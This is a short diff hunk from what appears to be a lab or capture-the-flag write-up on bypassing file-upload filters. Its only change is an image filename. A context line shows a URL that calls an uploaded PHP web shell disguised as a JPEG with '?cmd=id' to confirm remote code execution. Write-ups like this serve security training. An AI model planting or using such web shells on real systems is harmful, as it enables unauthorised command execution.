@@ -536,6 +536,6 @@ Visiting the uploaded file confirms remote code execution:
 http://94.237.120.119:48470/profile_images/shell.phar.jpg?cmd=id
 ```
 
-![Filtered output](images/whitelist-filter1.PNG)
+![Filtered output](images/whitelist-filter10.PNG)
 
 ---
